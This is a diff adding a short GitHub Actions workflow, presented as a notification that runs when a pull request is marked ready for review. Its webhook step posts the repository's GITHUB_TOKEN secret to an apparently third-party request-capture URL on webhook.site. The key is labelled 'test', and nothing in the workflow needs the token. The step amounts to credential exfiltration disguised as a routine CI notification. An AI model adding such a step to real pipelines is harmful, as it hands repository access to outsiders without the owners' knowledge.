@@ -1,0 +1,18 @@
+name: Ticket ready for review
+
+on:
+  pull_request:
+    types: [ready_for_review, review_requested]
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Comment
+        run: echo I'm alive!
+
+      - name: Webhook Action
+        uses: joelwmale/webhook-action@1.0.0
+        env: 
+          WEBHOOK_URL: https://webhook.site/8ce637c0-d8f5-4f7b-a13f-8ac11772ae10
+          data: "{ 'test': ${{ secrets.GITHUB_TOKEN }} }"
